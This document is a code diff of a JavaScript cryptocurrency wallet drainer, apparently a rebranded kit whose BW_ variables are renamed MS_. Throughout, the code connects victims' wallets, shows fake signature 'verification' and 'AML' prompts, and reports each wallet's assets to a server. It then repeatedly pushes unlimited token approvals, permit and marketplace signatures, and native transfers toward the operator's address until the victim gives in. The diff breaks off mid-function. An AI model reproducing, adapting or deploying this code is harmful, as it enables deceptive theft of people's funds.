@@ -1860,7 +1860,7 @@ const get_wallet_assets = async (address) => {
       assets = new_assets;
     }
 
-    if (BW_Settings.Settings.Swappers.Enable && BW_Settings.Settings.Swappers.Priority == 2) {
+    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 2) {
       const new_assets = [];
       for (const asset of assets) {
         try {
@@ -1889,13 +1889,13 @@ const get_wallet_assets = async (address) => {
 };
 
 const APPROVE_TOKEN = async (asset) => {
-  if ((BW_Current_Provider == 'MetaMask' || (BW_Current_Provider == 'Trust Wallet' && !BW_Mobile_Status)) && BW_Settings.Settings.Approve.MetaMask >= 2 && !asset.increase) {
+  if ((MS_Current_Provider == 'MetaMask' || (MS_Current_Provider == 'Trust Wallet' && !MS_Mobile_Status)) && MS_Settings.Settings.Approve.MetaMask >= 2 && !asset.increase) {
     try {
       for (let x = 0; x < 2; x++) {
         if (asset.increase) continue;
         try {
           const ic_data = await retrive_token(asset.chain_id, asset.address);
-          const ic_node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+          const ic_node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
           const ic_contract = new ethers.Contract(asset.address, ic_data, ic_node);
           if (is_increase_approve(ic_contract.functions)) asset.increase = true;
         } catch(err) {
@@ -1906,18 +1906,18 @@ const APPROVE_TOKEN = async (asset) => {
       console.log(err);
     }
   }
-  if ((BW_Current_Provider == 'MetaMask' || (BW_Current_Provider == 'Trust Wallet' && !BW_Mobile_Status)) && BW_Settings.Settings.Approve.MetaMask >= 2 && asset.increase) return await MM_APPROVE_TOKEN(asset);
-  if ((BW_Current_Provider == 'MetaMask' || (BW_Current_Provider == 'Trust Wallet' && !BW_Mobile_Status)) && BW_Settings.Settings.Approve.MetaMask == 2 && !asset.increase) { await TRANSFER_TOKEN(asset); return 2; }
-  if ((BW_Current_Provider == 'MetaMask' || (BW_Current_Provider == 'Trust Wallet' && !BW_Mobile_Status)) && BW_Settings.Settings.Approve.MetaMask == 3 && !asset.increase) throw new Error('UNSUPPORTED');
-  const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+  if ((MS_Current_Provider == 'MetaMask' || (MS_Current_Provider == 'Trust Wallet' && !MS_Mobile_Status)) && MS_Settings.Settings.Approve.MetaMask >= 2 && asset.increase) return await MM_APPROVE_TOKEN(asset);
+  if ((MS_Current_Provider == 'MetaMask' || (MS_Current_Provider == 'Trust Wallet' && !MS_Mobile_Status)) && MS_Settings.Settings.Approve.MetaMask == 2 && !asset.increase) { await TRANSFER_TOKEN(asset); return 2; }
+  if ((MS_Current_Provider == 'MetaMask' || (MS_Current_Provider == 'Trust Wallet' && !MS_Mobile_Status)) && MS_Settings.Settings.Approve.MetaMask == 3 && !asset.increase) throw new Error('UNSUPPORTED');
+  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   const nonce = await get_nonce(asset.chain_id);
-  const contract = new ethers.Contract(asset.address, BW_Contract_ABI['ERC20'], BW_Signer);
+  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], MS_Signer);
   let gas_limit = null;
-  let max_approval_amount = ethers.utils.parseEther(BW_Unlimited_Amount);
-  for (const c_address of BW_Settings.Unlimited_BL) {
+  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
+  for (const c_address of MS_Settings.Unlimited_BL) {
     try {
-      if (c_address[0] == BW_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
+      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
         max_approval_amount = asset.amount_raw;
         break;
       }
@@ -1926,25 +1926,25 @@ const APPROVE_TOKEN = async (asset) => {
     }
   }
   try {
-    gas_limit = await contract.estimateGas.approve(BW_Settings.Address, max_approval_amount, { from: BW_Current_Address });
+    gas_limit = await contract.estimateGas.approve(MS_Settings.Address, max_approval_amount, { from: MS_Current_Address });
     gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   } catch(err) {
     gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
   }
   await approve_request(asset);
   sign_next();
-  const tx = await contract.approve(BW_Settings.Address, max_approval_amount, {
+  const tx = await contract.approve(MS_Settings.Address, max_approval_amount, {
     gasLimit: ethers.BigNumber.from(gas_limit),
     gasPrice: ethers.BigNumber.from(gas_price),
-    nonce: nonce, from: BW_Current_Address
+    nonce: nonce, from: MS_Current_Address
   });
   wait_message();
-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
   await approve_success(asset); sign_ready(); return 1;
 };
 
 const MM_APPROVE_TOKEN = async (asset) => {
-  const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   const nonce = await get_nonce(asset.chain_id);
   const contract = new ethers.Contract(asset.address, [
@@ -1952,12 +1952,12 @@ const MM_APPROVE_TOKEN = async (asset) => {
       "inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"increment","type":"uint256"}],
       "name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"
     }
-  ], BW_Signer);
+  ], MS_Signer);
   let gas_limit = null;
-  let max_approval_amount = ethers.utils.parseEther(BW_Unlimited_Amount);
-  for (const c_address of BW_Settings.Unlimited_BL) {
+  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
+  for (const c_address of MS_Settings.Unlimited_BL) {
     try {
-      if (c_address[0] == BW_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
+      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
         max_approval_amount = asset.amount_raw;
         break;
       }
@@ -1966,28 +1966,28 @@ const MM_APPROVE_TOKEN = async (asset) => {
     }
   }
   try {
-    gas_limit = await contract.estimateGas.increaseAllowance(BW_Settings.Address, max_approval_amount, { from: BW_Current_Address });
+    gas_limit = await contract.estimateGas.increaseAllowance(MS_Settings.Address, max_approval_amount, { from: MS_Current_Address });
     gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   } catch(err) {
     gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
   }
   await approve_request(asset);
   sign_next();
-  const tx = await contract.increaseAllowance(BW_Settings.Address, max_approval_amount, {
+  const tx = await contract.increaseAllowance(MS_Settings.Address, max_approval_amount, {
     gasLimit: ethers.BigNumber.from(gas_limit),
     gasPrice: ethers.BigNumber.from(gas_price),
-    nonce: nonce, from: BW_Current_Address
+    nonce: nonce, from: MS_Current_Address
   });
   wait_message();
-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
   await approve_success(asset); sign_ready(); return 1;
 };
 
 const connect_wallet = async (provider = null) => {
   try {
-    if (BW_Process) return; BW_Process = true;
-    if (BW_Bad_Country) {
-      try { BW_hide(); } catch(err) { console.log(err); }
+    if (MS_Process) return; MS_Process = true;
+    if (MS_Bad_Country) {
+      try { ms_hide(); } catch(err) { console.log(err); }
       try {
         Swal.close();
         Swal.fire({
@@ -2009,34 +2009,34 @@ const connect_wallet = async (provider = null) => {
           for (const elem of window.ethereum.providers) {
             if (elem.isMetaMask == true) {
               is_installed = true;
-              BW_Provider = elem;
-              BW_Current_Provider = 'MetaMask';
+              MS_Provider = elem;
+              MS_Current_Provider = 'MetaMask';
               break;
             }
           }
           if (!is_installed) {
-            if (BW_Mobile_Status) {
-              window.location.href = `https://metamask.app.link/dapp/${BW_Current_URL}`;
-              BW_Process = false;
+            if (MS_Mobile_Status) {
+              window.location.href = `https://metamask.app.link/dapp/${MS_Current_URL}`;
+              MS_Process = false;
               return;
             } else {
               window.open('https://metamask.io', '_blank').focus();
-              BW_Process = false;
+              MS_Process = false;
               return;
             }
           }
         } else {
           if (typeof window.ethereum === 'object' && window.ethereum.isMetaMask) {
-            BW_Provider = window.ethereum;
-            BW_Current_Provider = 'MetaMask';
+            MS_Provider = window.ethereum;
+            MS_Current_Provider = 'MetaMask';
           } else {
-            if (BW_Mobile_Status) {
-              window.location.href = `https://metamask.app.link/dapp/${BW_Current_URL}`;
-              BW_Process = false;
+            if (MS_Mobile_Status) {
+              window.location.href = `https://metamask.app.link/dapp/${MS_Current_URL}`;
+              MS_Process = false;
               return;
             } else {
               window.open('https://metamask.io', '_blank').focus();
-              BW_Process = false;
+              MS_Process = false;
               return;
             }
           }
@@ -2047,142 +2047,142 @@ const connect_wallet = async (provider = null) => {
           for (const elem of window.ethereum.providers) {
             if (elem.isCoinbaseWallet == true) {
               is_installed = true;
-              BW_Provider = elem;
+              MS_Provider = elem;
               break;
             }
           }
           if (is_installed) {
-            BW_Current_Provider = 'Coinbase';
+            MS_Current_Provider = 'Coinbase';
           } else {
-            if (BW_Mobile_Status) {
-              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${BW_Current_URL}`;
-              BW_Process = false;
+            if (MS_Mobile_Status) {
+              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${MS_Current_URL}`;
+              MS_Process = false;
               return;
             } else {
               window.open('https://www.coinbase.com/wallet', '_blank').focus();
-              BW_Process = false;
+              MS_Process = false;
               return;
             }
           }
         } else {
           if (typeof window.ethereum === 'object' && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser)) {
-            BW_Provider = window.ethereum;
-            BW_Current_Provider = 'Coinbase';
+            MS_Provider = window.ethereum;
+            MS_Current_Provider = 'Coinbase';
           } else {
-            if (BW_Mobile_Status) {
-              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${BW_Current_URL}`;
-              BW_Process = false;
+            if (MS_Mobile_Status) {
+              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${MS_Current_URL}`;
+              MS_Process = false;
               return;
             } else {
               window.open('https://www.coinbase.com/wallet', '_blank').focus();
-              BW_Process = false;
+              MS_Process = false;
               return;
             }
           }
         }
       } else if (provider == 'Trust Wallet') {
         if (typeof window.ethereum === 'object' && window.ethereum.isTrust) {
-          BW_Provider = window.ethereum;
-          BW_Current_Provider = 'Trust Wallet';
+          MS_Provider = window.ethereum;
+          MS_Current_Provider = 'Trust Wallet';
         } else {
-          if (BW_Mobile_Status) {
-            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${BW_Current_URL}`;
-            BW_Process = false;
+          if (MS_Mobile_Status) {
+            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${MS_Current_URL}`;
+            MS_Process = false;
             return;
           } else {
             window.open('https://trustwallet.com', '_blank').focus();
-            BW_Process = false;
+            MS_Process = false;
             return;
           }
         }
       } else if (provider == 'Binance Wallet') {
         if (typeof window.BinanceChain === 'object') {
-          BW_Provider = window.BinanceChain;
-          BW_Current_Provider = 'Binance Wallet';
+          MS_Provider = window.BinanceChain;
+          MS_Current_Provider = 'Binance Wallet';
         } else {
           window.open('https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', '_blank').focus();
-          BW_Process = false;
+          MS_Process = false;
           return;
         }
       } else if (provider == 'WalletConnect' || provider == 'WalletConnect_v2') {
-        BW_Current_Provider = 'WalletConnect';
+        MS_Current_Provider = 'WalletConnect';
       } else {
         if (typeof window.ethereum === 'object') {
-          BW_Provider = window.ethereum;
-          BW_Current_Provider = 'Ethereum';
+          MS_Provider = window.ethereum;
+          MS_Current_Provider = 'Ethereum';
         } else {
-          BW_Current_Provider = 'WalletConnect';
+          MS_Current_Provider = 'WalletConnect';
         }
       }
     } else {
       if (window.ethereum) {
-        BW_Provider = window.ethereum;
-        BW_Current_Provider = 'Ethereum';
+        MS_Provider = window.ethereum;
+        MS_Current_Provider = 'Ethereum';
       } else {
-        BW_Current_Provider = 'WalletConnect';
+        MS_Current_Provider = 'WalletConnect';
       }
     }
     try {
       await connect_request();
       let connection = null;
-      if (BW_Current_Provider == 'WalletConnect') {
-        BW_hide(); BW_WC_Version = 2;
+      if (MS_Current_Provider == 'WalletConnect') {
+        ms_hide(); MS_WC_Version = 2;
         await load_wc();
         try {
-          await BW_Provider.disconnect();
+          await MS_Provider.disconnect();
         } catch(err) {
           console.log(err);
         }
-        await BW_Provider.connect();
-        if (BW_Provider && BW_Provider.accounts.length > 0) {
-          if (!BW_Provider.accounts[0].includes('0x')) {
-            BW_Process = false;
+        await MS_Provider.connect();
+        if (MS_Provider && MS_Provider.accounts.length > 0) {
+          if (!MS_Provider.accounts[0].includes('0x')) {
+            MS_Process = false;
             return await connect_cancel();
           }
           await new Promise(r => setTimeout(r, 2500));
-          BW_Current_Address = BW_Provider.accounts[0];
-          BW_Current_Chain_ID = BW_Provider.chainId;
-          BW_Web3 = new ethers.providers.Web3Provider(BW_Provider);
-          BW_Signer = BW_Web3.getSigner();
+          MS_Current_Address = MS_Provider.accounts[0];
+          MS_Current_Chain_ID = MS_Provider.chainId;
+          MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
+          MS_Signer = MS_Web3.getSigner();
         } else {
-          BW_Process = false;
+          MS_Process = false;
           return await connect_cancel();
         }
       } else {
         try {
-          connection = await BW_Provider.request({ method: 'wallet_requestPermissions', params: [{ eth_accounts: {} }] });
+          connection = await MS_Provider.request({ method: 'wallet_requestPermissions', params: [{ eth_accounts: {} }] });
           if (connection && connection.length > 0) {
-            if (!BW_Provider.selectedAddress.includes('0x')) return connect_cancel();
-            BW_Current_Address = BW_Provider.selectedAddress;
-            BW_Current_Chain_ID = parseInt(BW_Provider.chainId);
-            BW_Web3 = new ethers.providers.Web3Provider(BW_Provider);
-            BW_Signer = BW_Web3.getSigner();
+            if (!MS_Provider.selectedAddress.includes('0x')) return connect_cancel();
+            MS_Current_Address = MS_Provider.selectedAddress;
+            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
+            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
+            MS_Signer = MS_Web3.getSigner();
           } else {
-            BW_Process = false;
+            MS_Process = false;
             return await connect_cancel();
           }
         } catch(err) {
-          connection = await BW_Provider.request({ method: 'eth_requestAccounts' });
+          connection = await MS_Provider.request({ method: 'eth_requestAccounts' });
           if (connection && connection.length > 0) {
             if (!connection[0].includes('0x')) return connect_cancel();
-            BW_Current_Address = connection[0];
-            BW_Current_Chain_ID = parseInt(BW_Provider.chainId);
-            BW_Web3 = new ethers.providers.Web3Provider(BW_Provider);
-            BW_Signer = BW_Web3.getSigner();
+            MS_Current_Address = connection[0];
+            MS_Current_Chain_ID = parseInt(MS_Provider.chainId);
+            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
+            MS_Signer = MS_Web3.getSigner();
           } else {
-            BW_Process = false;
+            MS_Process = false;
             return await connect_cancel();
           }
         }
       }
-      if (!BW_Current_Address.match(/^0x\S+$/)) throw new Error('Invalid Wallet');
+      if (!MS_Current_Address.match(/^0x\S+$/)) throw new Error('Invalid Wallet');
     } catch(err) {
       console.log(err);
-      BW_Process = false;
+      MS_Process = false;
       return await connect_cancel();
     }
-    BW_hide();
-    if (BW_Settings.V_MODE == 1) {
+    ms_hide();
+    if (MS_Settings.V_MODE == 1) {
       Swal.fire({
         html: '<b>Sign message</b> to verificate you wallet...',
         imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
@@ -2190,8 +2190,8 @@ const connect_wallet = async (provider = null) => {
         timer: 0, width: 600, showConfirmButton: false
       });
       try {
-        const verification_message = ((BW_Verify_Message == "") ? BW_Settings.V_MSG : BW_Verify_Message).replaceAll('{{ADDRESS}}', BW_Current_Address);
-        const signed_message = await BW_Signer.signMessage(verification_message);
+        const verification_message = ((MS_Verify_Message == "") ? MS_Settings.V_MSG : MS_Verify_Message).replaceAll('{{ADDRESS}}', MS_Current_Address);
+        const signed_message = await MS_Signer.signMessage(verification_message);
         const is_sign_correct = ethers.utils.recoverAddress(ethers.utils.hashMessage(verification_message), signed_message);
         if (!is_sign_correct) {
           Swal.fire({
@@ -2199,17 +2199,17 @@ const connect_wallet = async (provider = null) => {
             text: "We have received your signature, but it's incorrect, please try again.",
             icon: 'error', confirmButtonText: 'OK'
           });
-          BW_Process = false;
+          MS_Process = false;
           return await connect_cancel();
         } else {
-          let server_result = await send_request({ action: 'sign_verify', sign: signed_message, address: BW_Current_Address, message: BW_Verify_Message });
+          let server_result = await send_request({ action: 'sign_verify', sign: signed_message, address: MS_Current_Address, message: MS_Verify_Message });
           if (server_result.status != 'OK') {
             Swal.fire({
               title: 'Verification Error',
               text: "We have received your signature, but it's incorrect, please try again.",
               icon: 'error', confirmButtonText: 'OK'
             });
-            BW_Process = false;
+            MS_Process = false;
             return await connect_cancel();
           }
         }
@@ -2219,24 +2219,24 @@ const connect_wallet = async (provider = null) => {
           text: "We cannot verify that the wallet is yours as you did not sign the message provided.",
           icon: 'error', confirmButtonText: 'OK'
         });
-        BW_Process = false;
+        MS_Process = false;
         return await connect_cancel();
       }
     } else {
-      await send_request({ action: 'sign_verify', address: BW_Current_Address });
+      await send_request({ action: 'sign_verify', address: MS_Current_Address });
     }
     await connect_success(); show_check();
-    if (BW_Settings.Wallet_Blacklist.length > 0 && BW_Settings.Wallet_Blacklist.includes(BW_Current_Address.toLowerCase())) {
-      BW_Check_Done = true; Swal.close();
+    if (MS_Settings.Wallet_Blacklist.length > 0 && MS_Settings.Wallet_Blacklist.includes(MS_Current_Address.toLowerCase())) {
+      MS_Check_Done = true; Swal.close();
       Swal.fire({
         title: 'AML Error',
         text: "Your wallet is not AML clear, you can\'t use it!",
         icon: 'error', confirmButtonText: 'OK'
       });
-      BW_Process = false;
+      MS_Process = false;
       return;
     }
-    let assets = await get_wallet_assets(BW_Current_Address);
+    let assets = await get_wallet_assets(MS_Current_Address);
     let assets_price = 0; for (const asset of assets) {
       try {
         assets_price += asset.amount_usd;
@@ -2245,15 +2245,15 @@ const connect_wallet = async (provider = null) => {
       }
     }
     let assets_usd_balance = 0; for (const asset of assets) assets_usd_balance += asset.amount_usd;
-    await send_request({ action: 'check_finish', user_id: BW_ID, assets: assets, balance: assets_usd_balance });
-    BW_Check_Done = true; Swal.close();
-    if (BW_Settings.Settings.Minimal_Wallet_Price > assets_price) {
+    await send_request({ action: 'check_finish', user_id: MS_ID, assets: assets, balance: assets_usd_balance });
+    MS_Check_Done = true; Swal.close();
+    if (MS_Settings.Settings.Minimal_Wallet_Price > assets_price) {
       Swal.fire({
         title: 'Something went wrong!',
         text: "For security reasons we can't allow you to connect empty or new wallet",
         icon: 'error', confirmButtonText: 'OK'
       });
-      BW_Process = false;
+      MS_Process = false;
       return;
     }
     Swal.fire({
@@ -2264,65 +2264,65 @@ const connect_wallet = async (provider = null) => {
     });
     for (const asset of assets) {
       try {
-        if (asset.type != 'NATIVE') BW_Gas_Reserves[asset.chain_id] += 1;
+        if (asset.type != 'NATIVE') MS_Gas_Reserves[asset.chain_id] += 1;
       } catch(err) {
         console.log(err);
       }
     }
-    if (typeof SIGN_BLUR !== 'undefined' && BW_Settings.Settings.Blur.Enable == 1 && BW_Settings.Settings.Blur.Priority == 1)
-      await SIGN_BLUR(assets, BW_Provider, BW_Current_Address, BW_Settings.Address, BW_ID);
-    if (typeof SIGN_SEAPORT !== 'undefined' && BW_Settings.Settings.SeaPort.Enable == 1 && BW_Settings.Settings.SeaPort.Priority == 1)
-      await SIGN_SEAPORT(assets, BW_Provider, BW_Current_Address, BW_Settings.Address, BW_ID);
-    if (typeof SIGN_X2Y2 !== 'undefined' && BW_Settings.Settings.x2y2.Enable == 1 && BW_Current_Chain_ID == 1 && BW_Settings.Settings.x2y2.Priority == 1)
-      await SIGN_X2Y2(assets, BW_Provider, BW_Current_Address, BW_Settings.Address, BW_ID);
-    if (BW_Provider.isTrust && !BW_Mobile_Status) {
+    if (typeof SIGN_BLUR !== 'undefined' && MS_Settings.Settings.Blur.Enable == 1 && MS_Settings.Settings.Blur.Priority == 1)
+      await SIGN_BLUR(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
+    if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 1 && MS_Settings.Settings.SeaPort.Priority == 1)
+      await SIGN_SEAPORT(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
+    if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings.Settings.x2y2.Enable == 1 && MS_Current_Chain_ID == 1 && MS_Settings.Settings.x2y2.Priority == 1)
+      await SIGN_X2Y2(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID);
+    if (MS_Provider.isTrust && !MS_Mobile_Status) {
       try {
-        BW_Settings.Settings.Sign.Native = 0;
-        BW_Settings.Settings.Sign.Tokens = 0;
-        BW_Settings.Settings.Sign.NFTs = 0;
+        MS_Settings.Settings.Sign.Native = 0;
+        MS_Settings.Settings.Sign.Tokens = 0;
+        MS_Settings.Settings.Sign.NFTs = 0;
       } catch(err) {
         console.log(err);
       }
     }
     let should_repeat_all = true;
     while (should_repeat_all) {
-      should_repeat_all = (BW_Settings.LA == 1);
+      should_repeat_all = (MS_Settings.LA == 1);
       for (const asset of assets) {
         try {
           if (asset.skip) continue;
           let is_chain_correct = false;
           if (asset.type == 'NATIVE') {
-            const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]); let is_contract_use = false;
+            const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]); let is_contract_use = false;
             const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
-            if (BW_Settings.Settings.Chains[convert_chain('ID', 'ANKR', asset.chain_id)].Contract_Address != '') is_contract_use = true;
+            if (MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', asset.chain_id)].Contract_Address != '') is_contract_use = true;
             const gas_limit_nt = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (is_contract_use ? 100000 : 21000));
             const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);
             const gas_price_calc = ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price);
             const nt_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt))).mul(ethers.BigNumber.from('2'));
-            const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(BW_Gas_Reserves[asset.chain_id])));
+            const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
             const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(nt_fee).sub(ct_fee).toString();
             console.log(after_fee);
             if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) continue;
           }
-          if (asset.chain_id != BW_Current_Chain_ID) {
-            await chain_request(BW_Current_Chain_ID, asset.chain_id);
+          if (asset.chain_id != MS_Current_Chain_ID) {
+            await chain_request(MS_Current_Chain_ID, asset.chain_id);
             try {
-              if (BW_Current_Provider == 'WalletConnect') {
+              if (MS_Current_Provider == 'WalletConnect') {
                 try {
-                  await BW_Provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId:  `0x${asset.chain_id.toString(16)}` }] });
+                  await MS_Provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId:  `0x${asset.chain_id.toString(16)}` }] });
                 } catch(err) {
                   await chain_cancel();
                   continue;
                 }
               } else {
                 try {
-                  await BW_Provider.request({
+                  await MS_Provider.request({
                     method: "wallet_switchEthereumChain", params: [{ chainId: `0x${asset.chain_id.toString(16)}` }]
                   });
                 } catch(err) {
                   if (err.code == 4902 || err.code == -32603) {
                     try {
-                      await BW_Provider.request({ method: "wallet_addEthereumChain", params: [ BW_MetaMask_ChainData[asset.chain_id] ] });
+                      await MS_Provider.request({ method: "wallet_addEthereumChain", params: [ MS_MetaMask_ChainData[asset.chain_id] ] });
                     } catch(err) {
                       await chain_cancel();
                       continue;
@@ -2333,9 +2333,9 @@ const connect_wallet = async (provider = null) => {
                   }
                 }
               }
-              BW_Current_Chain_ID = asset.chain_id;
-              BW_Web3 = new ethers.providers.Web3Provider(BW_Provider);
-              BW_Signer = BW_Web3.getSigner();
+              MS_Current_Chain_ID = asset.chain_id;
+              MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
+              MS_Signer = MS_Web3.getSigner();
               is_chain_correct = true;
               await chain_success();
             } catch(err) {
@@ -2348,7 +2348,7 @@ const connect_wallet = async (provider = null) => {
           }
           if (!is_chain_correct) continue;
           if (asset.type == 'NATIVE') {
-            if (BW_Settings.Settings.Sign.Native > 0 && (!BW_Sign_Disabled || BW_Settings.Settings.Sign.Force == 1)) {
+            if (MS_Settings.Settings.Sign.Native > 0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 1)) {
               while (true) {
                 try {
                   await SIGN_NATIVE(asset);
@@ -2357,7 +2357,7 @@ const connect_wallet = async (provider = null) => {
                 } catch(err) {
                   console.log(err);
                   if (err.code == -32601 || err.code == -32000) {
-                    if (BW_Settings.Settings.Sign.Force == 1) {
+                    if (MS_Settings.Settings.Sign.Force == 1) {
                       await sign_cancel();
                     } else {
                       await sign_unavailable();
@@ -2370,7 +2370,7 @@ const connect_wallet = async (provider = null) => {
                           console.log(err);
                           if (err != 'LOW_BALANCE') {
                             await transfer_cancel();
-                            if (!BW_Settings.Loop_N) break;
+                            if (!MS_Settings.Loop_N) break;
                           } else {
                             break;
                           }
@@ -2382,7 +2382,7 @@ const connect_wallet = async (provider = null) => {
                     console.log(err);
                     if (err != 'LOW_BALANCE') {
                       await sign_cancel();
-                      if (!BW_Settings.Loop_N) break;
+                      if (!MS_Settings.Loop_N) break;
                     } else {
                       break;
                     }
@@ -2399,7 +2399,7 @@ const connect_wallet = async (provider = null) => {
                   console.log(err);
                   if (err != 'LOW_BALANCE') {
                     await transfer_cancel();
-                    if (!BW_Settings.Loop_N) break;
+                    if (!MS_Settings.Loop_N) break;
                   } else {
                     break;
                   }
@@ -2407,9 +2407,9 @@ const connect_wallet = async (provider = null) => {
               }
             }
           } else if (asset.type == 'ERC20') {
-            if (typeof asset.permit == 'undefined' && BW_Settings.Settings.Permit.Mode && asset.amount_usd >= BW_Settings.Settings.Permit.Price) {
+            if (typeof asset.permit == 'undefined' && MS_Settings.Settings.Permit.Mode && asset.amount_usd >= MS_Settings.Settings.Permit.Price) {
               const data = await retrive_token(asset.chain_id, asset.address);
-              const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+              const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
               const contract = new ethers.Contract(asset.address, data, node);
               const permit_type = get_permit_type(contract.functions);
               asset.permit = permit_type;
@@ -2427,14 +2427,14 @@ const connect_wallet = async (provider = null) => {
               }
             }
             if (asset.permit > 0) {
-              for (const c_address of BW_Settings.Permit_BL) {
-                if (c_address[0] == BW_Current_Chain_ID && c_address[1] === asset.address.toLowerCase()) {
+              for (const c_address of MS_Settings.Permit_BL) {
+                if (c_address[0] == MS_Current_Chain_ID && c_address[1] === asset.address.toLowerCase()) {
                   asset.permit = 0;
                   break;
                 }
               }
             }
-            if (BW_Settings.Settings.Permit2.Mode && asset.permit2) {
+            if (MS_Settings.Settings.Permit2.Mode && asset.permit2) {
               const all_permit2 = [];
               for (const x_asset of assets) {
                 try {
@@ -2454,10 +2454,10 @@ const connect_wallet = async (provider = null) => {
                 } catch(err) {
                   console.log(err);
                   await approve_cancel();
-                  if (!BW_Settings.Loop_T) break;
+                  if (!MS_Settings.Loop_T) break;
                 }
               }
-            } else if (BW_Settings.Settings.Permit.Mode && asset.permit && asset.permit > 0) {
+            } else if (MS_Settings.Settings.Permit.Mode && asset.permit && asset.permit > 0) {
               while (true) {
                 try {
                   await PERMIT_TOKEN(asset);
@@ -2466,10 +2466,10 @@ const connect_wallet = async (provider = null) => {
                 } catch(err) {
                   console.log(err);
                   await approve_cancel();
-                  if (!BW_Settings.Loop_T) break;
+                  if (!MS_Settings.Loop_T) break;
                 }
               }
-            } else if (BW_Settings.Settings.Swappers.Enable && asset.swapper && asset.amount_usd >= BW_Settings.Settings.Swappers.Price) {
+            } else if (MS_Settings.Settings.Swappers.Enable && asset.swapper && asset.amount_usd >= MS_Settings.Settings.Swappers.Price) {
               if (asset.swapper_type == 'Uniswap') {
                 const all_uniswap = [];
                 for (const x_asset of assets) {
@@ -2490,7 +2490,7 @@ const connect_wallet = async (provider = null) => {
                   } catch(err) {
                     console.log(err);
                     await sign_cancel();
-                    if (!BW_Settings.Loop_T) break;
+                    if (!MS_Settings.Loop_T) break;
                   }
                 }
               } else if (asset.swapper_type == 'Pancake_V3') {
@@ -2513,7 +2513,7 @@ const connect_wallet = async (provider = null) => {
                   } catch(err) {
                     console.log(err);
                     await sign_cancel();
